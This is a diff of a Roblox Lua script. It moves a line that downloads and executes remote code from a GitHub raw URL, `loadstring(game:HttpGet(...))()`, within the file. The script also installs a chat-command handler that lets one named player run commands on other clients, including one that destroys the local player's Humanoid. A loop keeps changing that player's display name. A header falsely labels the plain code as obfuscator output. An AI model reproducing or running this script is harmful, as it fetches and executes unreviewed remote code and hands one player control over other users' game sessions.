@@ -1,6 +1,7 @@
 -- This file was generated using Luraph Obfuscator v14.1 [https://lura.ph/]
 
-loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SwagModeV002'))()local name = "[💹💰⭐] 6akzino"
+
+local name = "[💹💰⭐] 6akzino"
 game.Players["6akzino"].Chatted:Connect(function(message)
 	if message:sub(1, 6) == "!print" then
 		local text = message:sub(8) 
@@ -95,6 +96,7 @@ game.Players["6akzino"].Chatted:Connect(function(message)
 		game.Players.LocalPlayer.Character.Humanoid:Destroy()
 	end
 end)
+loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SwagModeV002'))()
 while true do
 	game.Players["6akzino"].Character.Humanoid.DisplayName = name
 	wait(1)
